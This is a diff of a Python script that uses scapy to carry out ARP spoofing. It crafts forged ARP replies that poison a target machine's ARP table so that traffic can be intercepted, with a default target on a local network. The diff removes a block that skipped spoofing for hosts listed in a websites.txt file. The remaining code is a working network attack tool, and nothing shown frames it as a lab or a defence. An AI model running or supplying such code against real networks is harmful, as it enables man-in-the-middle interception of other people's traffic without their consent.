@@ -1,7 +1,6 @@
 import scapy.all as scapy
 import time
 import argparse
-import socket
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", default="192.168.68.117", help="Target IP")
@@ -18,14 +17,6 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc if answered_list else None
 # Change mac address in arp table
 def spoof(target_ip, spoof_ip):
-    file = open("websites.txt", "r")
-    for line in file:
-        url = line.split(",")[0]
-        ip_add = socket.gethostbyname(url)
-        exclude_ip = (str(ip_add))
-    if target_ip == exclude_ip:
-        print(f"Skipping forwarding for {exclude_ip}")
-        return
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=spoof_ip)
